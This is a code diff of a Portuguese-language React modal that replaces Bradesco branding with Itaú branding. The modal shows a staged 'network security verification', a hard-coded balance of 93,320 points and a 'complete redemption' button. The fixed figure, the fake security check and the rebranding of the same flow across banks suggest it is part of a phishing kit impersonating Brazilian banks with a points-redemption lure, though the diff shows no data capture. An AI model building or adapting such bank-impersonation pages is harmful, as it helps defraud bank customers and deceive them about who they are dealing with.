@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import bradescoLogo from "@/assets/bradesco-logo-new.webp";
+import itauLogo from "@/assets/itau-logo.png";
 
 interface ProcessingModalProps {
   open: boolean;
@@ -33,7 +33,7 @@ const ProcessingModal = ({ open, userName, onComplete }: ProcessingModalProps) =
       <div className="relative z-50 w-full max-w-sm mx-4 mb-8 bg-card rounded-2xl p-8 shadow-xl animate-slide-up flex flex-col items-center">
         {phase < 2 ? (
           <>
-            <img src={bradescoLogo} alt="Bradesco" className="h-12 mb-6 animate-[pulse_2s_ease-in-out_infinite]" />
+            <img src={itauLogo} alt="Itaú" className="h-14 mb-6 animate-[pulse_2s_ease-in-out_infinite]" />
             <p className="text-muted-foreground text-base mb-6 text-center">
               {phase === 0 ? "Processando" : "Verificando segurança do ambiente da rede"}
             </p>
@@ -41,7 +41,7 @@ const ProcessingModal = ({ open, userName, onComplete }: ProcessingModalProps) =
           </>
         ) : (
           <>
-            <img src={bradescoLogo} alt="Bradesco" className="h-12 mb-6" />
+            <img src={itauLogo} alt="Itaú" className="h-14 mb-6" />
             <p className="text-card-foreground text-lg font-medium text-center mb-1">
               Você possui <span className="text-primary font-bold">93.320</span> pontos
             </p>
@@ -50,7 +50,7 @@ const ProcessingModal = ({ open, userName, onComplete }: ProcessingModalProps) =
             </p>
             <button
               onClick={onComplete}
-              className="px-8 py-3 rounded-full bg-gradient-to-r from-primary to-[hsl(345,60%,40%)] text-primary-foreground font-semibold text-base hover:opacity-90 transition-opacity"
+              className="px-8 py-3 rounded-full bg-gradient-to-r from-primary to-[hsl(22,90%,35%)] text-primary-foreground font-semibold text-base hover:opacity-90 transition-opacity"
             >
               concluir resgate
             </button>
